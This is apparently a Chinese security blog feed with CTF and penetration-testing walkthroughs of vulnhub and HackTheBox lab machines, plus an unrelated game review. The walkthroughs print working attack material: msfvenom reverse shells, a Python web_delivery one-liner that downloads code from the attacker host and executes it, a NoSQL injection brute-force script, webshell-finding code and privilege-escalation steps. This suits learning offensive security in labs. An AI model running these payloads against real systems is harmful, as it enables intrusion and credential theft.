$filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));var_dump(unserialize($a));</code></pre><p>这时候得到的结果</p><pre><code class="php">a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>再进行反序列化</p><pre><code>array(3) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;  &#39;img&#39; =&gt;  string(20) &quot;ZDBnM19mMWFnLnBocAo=&quot;  &#39;dd&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>可以看到成功地覆盖了img属性</p><p>ps,又测试了一下如果有两个img属性会怎么搞</p><pre><code class="php">$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:3:&quot;img&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;</code></pre><p>得到的结果是：</p><pre><code class="php">array(2) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:62:&quot;a&quot;  &#39;img&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>此时img属性被合并了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文明六玩后感</title>
      <link href="/posts/61b7ba22/"/>
      <url>/posts/61b7ba22/</url>
      
        <content type="html"><![CDATA[<p>完了一段的时间的文明六，（虽然才48个小时</p><p><img src="/posts/61b7ba22/1583294758274.png" alt></p><h2 id="总体感觉"><a href="#总体感觉" class="headerlink" title="总体感觉"></a>总体感觉</h2><p>一开始玩这个游戏有点不知所措，因为这个游戏的信息量实在是太大了，后来慢慢地从别人的视频中才逐渐的熟悉起来。</p><p>文明六大概分为几个部分吧，首先是最基本的城市，可以建造区域，练兵，造工人，开拓者。然后是</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-DC-8</title>
      <link href="/posts/24a0544e/"/>
      <url>/posts/24a0544e/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><pre><code>PORT   STATE SERVICE  VERSION22/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  ssl/http Apache|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><pre><code>+-------+---------------------------------------------------------+| name  | pass                                                    |+-------+---------------------------------------------------------+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+-------+---------------------------------------------------------+</code></pre><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src="/posts/24a0544e/1583217110935.png" alt></p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw  -o shell.php</code></pre><p>生成 shell ，修改</p><p><img src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><pre><code>www-data@dc-8:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null                     /usr/bin/chfn                                             /usr/bin/gpasswd                                          /usr/bin/chsh                                             /usr/bin/passwd                                           /usr/bin/sudo                                             /usr/bin/newgrp                                           /usr/sbin/exim4                                           /usr/lib/openssh/ssh-keysign                              /usr/lib/eject/dmcrypt-get-device                         /usr/lib/dbus-1.0/dbus-daemon-launch-helper               /bin/ping                                                 /bin/su                                                   /bin/umount                                               /bin/mount                                                </code></pre><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><pre><code>set ff=unix</code></pre><p><img src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB mango靶机实战</title>
      <link href="/posts/73230382/"/>
      <url>/posts/73230382/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Traverxec靶机实战</title>
      <link href="/posts/d5bfc2a3/"/>
      <url>/posts/d5bfc2a3/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-最长回文字串</title>
      <link href="/posts/a99288c/"/>
      <url>/posts/a99288c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-Connectthedots</title>
      <link href="/posts/e4ff8385/"/>
      <url>/posts/e4ff8385/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven![*] 192.168.99.104:21 - USER: 530 Permission denied.[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached[*] Exploit completed, but no session was created.</code></pre><p>尝试匿名登陆没有成功</p><p><img src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src="/posts/e4ff8385/1575977956725.png" alt></p><pre><code>You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</code></pre><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><pre><code>msf5 auxiliary(scanner/nfs/nfsmount) &gt; exploit [+] 192.168.99.104:111    - 192.168.99.104 NFS Export: /home/morris [*][*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><pre><code>I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..blehguessme090</code></pre><p>于是成功登陆morris用户<br><img src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub靶机渗透-Connectthedots-walkthrough-ba4566674ba</a><br><a href="https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub靶机渗透-Connectthedots-vulnhub-61787608dc6c</a>_</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-HackInOs</title>
      <link href="/posts/fcea4f6a/"/>
      <url>/posts/fcea4f6a/</url>
      
        <content type="html"><![CDATA[<h1 id="HackInOs-有内网"><a href="#HackInOs-有内网" class="headerlink" title="HackInOs(有内网)"></a>HackInOs(有内网)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP 192.168.99.100<br>kali IP 192.168.99.101</p><p>nmap扫描结果</p><p><img src="/posts/fcea4f6a/1576559471820.png" alt></p><p>存在上传点但是无法上传文件</p><p><img src="/posts/fcea4f6a/1576559561592.png" alt></p><p>Burp抓包发现页面源代码有注释<br><a href="https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php" target="_blank" rel="noopener">https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</a></p><p>看到提示</p><p>看到其只使用了<code>getimagesize</code>函数进行检验<br>通过加添GIF89a可以绕过上传</p><p>而文件的名字是这么产生的<br><img src="/posts/fcea4f6a/1576560249639.png" alt></p><p>于是上传一个一句话木马，然后对目录进行爆破即可</p><pre><code># coding:utf-8import hashlibimport requestsbase_url = &quot;http://192.168.99.100:8000/uploads/&quot;target = []for i in range(101):    shell = &#39;shell.php&#39; + str(i)     shell_md5 = hashlib.md5(shell.encode(&#39;utf-8&#39;)).hexdigest()    target.append(base_url + shell_md5 + &#39;.php&#39;)for t in target:    r = requests.get(t)    if r.status_code == 200:        print(&quot;find it!&quot;)        print(t)        break</code></pre><p>之后使用蚁剑成功连接<br><img src="/posts/fcea4f6a/1576560324056.png" alt></p><p>但是发现上传不久之后shell就被删掉了</p><p>所以需要将shell移动到html目录下，(考验手速的时候到了)</p><p><img src="/posts/fcea4f6a/1576560733771.png" alt><br>此时成功得到shell，开始提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><img src="/posts/fcea4f6a/1576561228491.png" alt></p><p>使用tail命令查看<code>/etc/shadow</code></p><p>将root用户复制过来，使用john进行爆破</p><p><img src="/posts/fcea4f6a/1576561315061.png" alt></p><p>得到root账号的密码是john</p><p><img src="/posts/fcea4f6a/1576561335215.png" alt></p><p>之后切换到root用户查看flag，但是并没有结束</p><p>运行提权辅助脚本</p><p><img src="/posts/fcea4f6a/1576561435933.png" alt></p><p>注意到提权辅助脚本提示有docker<br><img src="/posts/fcea4f6a/1576561476445.png" alt></p><p>查看IP<br><img src="/posts/fcea4f6a/1576561501817.png" alt></p><p>看这个IP地址很像是docker中的地址</p><p>尝试直接用root账户及其密码john进行连接，失败</p><p>大概猜到了我只是拿到了一台docker容器的权限，并没有进入到主机</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>反弹的shell功能还是弱了，想办法得到一个<code>meterpreter</code></p><p>这里有记录一下通过shell拿到<code>meterpreter</code>的几种办法</p><h3 id="web-delivery脚本"><a href="#web-delivery脚本" class="headerlink" title="web_delivery脚本"></a>web_delivery脚本</h3><p>使用<code>exploit/multi/script/web_delivery</code> </p><p>设置好相关参数</p><p><img src="/posts/fcea4f6a/1576562272920.png" alt></p><p>在反弹的shell中运行这段payload</p><pre><code>python -c &quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://192.168.99.101:8080/1PrsFQbkzsmuk5&#39;);exec(r.read());&quot;</code></pre><p>得到<code>meterpreter</code>之后输入<code>background</code>让其挂起</p><h3 id="使用msfenvom生成木马"><a href="#使用msfenvom生成木马" class="headerlink" title="使用msfenvom生成木马"></a>使用msfenvom生成木马</h3><p>使用<code>exploit/multi/handler</code> 这个exploit模块</p><p>加载<code>linux/x86/meterpreter_reverse_tcp</code> 这个payload，同时通过<code>msfvenom</code> 去生成一个木马</p><p><img src="/posts/fcea4f6a/1577094332538.png" alt><br><code>msfvenom</code>生成木马</p><p><code>msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.99.102 lport=4444 -f elf -o shell</code></p><p><img src="/posts/fcea4f6a/1577094345676.png" alt></p><p>蚁剑上传<br><img src="/posts/fcea4f6a/1577094459850.png" alt><br>执行</p><p><img src="/posts/fcea4f6a/1577094504865.png" alt></p><p>反弹得到<code>meterpreter</code></p><p><img src="/posts/fcea4f6a/1577094525517.png" alt></p><p>得到子网信息<br><img src="/posts/fcea4f6a/1577094592386.png" alt></p><p>之后通过metasploit之后添加一条路由<br><img src="/posts/fcea4f6a/1576562463870.png" alt></p><p>此时就可以看到添加的路由信息了</p><p><img src="/posts/fcea4f6a/1576581218733.png" alt></p><p>路由添加也可以通过：<code>rout add 172.18.0.0 255.255.0.0 1</code></p><p>指定了网段和子网掩码，以及对应的session<br><img src="/posts/fcea4f6a/1577094657843.png" alt></p><p>这之后我们就可以在<code>metasploit</code>中访问内网的地址了，先进行主机发现</p><p><img src="/posts/fcea4f6a/1576562503028.png" alt></p><p>发现了四台主机</p><p>进行后续的端口扫描<br><img src="/posts/fcea4f6a/1576562587710.png" alt><br>(由于扫描速度比较慢，参数调整了一下)</p><p><img src="/posts/fcea4f6a/1576581339308.png" alt></p><p>这里也尝试通过<code>proxychain</code>去进行扫描</p><h3 id="proxychain的配置"><a href="#proxychain的配置" class="headerlink" title="proxychain的配置"></a>proxychain的配置</h3><p><img src="/posts/fcea4f6a/1577095583741.png" alt></p><p>使用socks4a代理，修改<code>/etc/proxychains.conf</code>文件，</p><p><img src="/posts/fcea4f6a/1577095622289.png" alt><br> 取消注释同时在最后一行加上<code>127.0.0.1 1080</code><br>由于<code>proxyresolv</code>的位置有点问题，cp过来</p><p> <code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>之后可以通过<code>proxychains nmap -A -T4 172.18.0.2</code>启动nmap扫描，但是扫描的结果有问题</p><pre><code>root@kali:~# proxyresolv 172.18.0.3|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK172.18.0.3</code></pre><p>能够正常解析但是还是存在问题</p><p>172.18.0.2 开放了3306端口数据库，进行连接</p><p><img src="/posts/fcea4f6a/1576563049227.png" alt></p><p>此处也可以通过<code>portfwd add -l 8123 -r 172.18.0.3 -p 3306</code>端口转发到本地进行连接</p><p><code>mysql -h 127.0.0.1  -P 8123 -uwordpress -pwordpress</code><br><img src="/posts/fcea4f6a/1577094918289.png" alt></p><p>查看数据<br><img src="/posts/fcea4f6a/1576563178481.png" alt></p><p><img src="/posts/fcea4f6a/1576563190812.png" alt></p><p>解密之后得到123456<br><img src="/posts/fcea4f6a/1576563163280.png" alt></p><p>于是尝试直接使用该用户登陆主机</p><p>该用户在docker组中，可以尝试通过docker提权</p><p><img src="/posts/fcea4f6a/1576581408046.png" alt></p><p>运行的docker镜像<br><img src="/posts/fcea4f6a/1576581491492.png" alt></p><p>docker挂载即可<br><img src="/posts/fcea4f6a/1577096085570.png" alt></p><p>得到flag<br><img src="/posts/fcea4f6a/1576581453268.png" alt></p><p>另外一种方式提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>查找SUID用户运行的程序<br><img src="/posts/fcea4f6a/1576581556847.png" 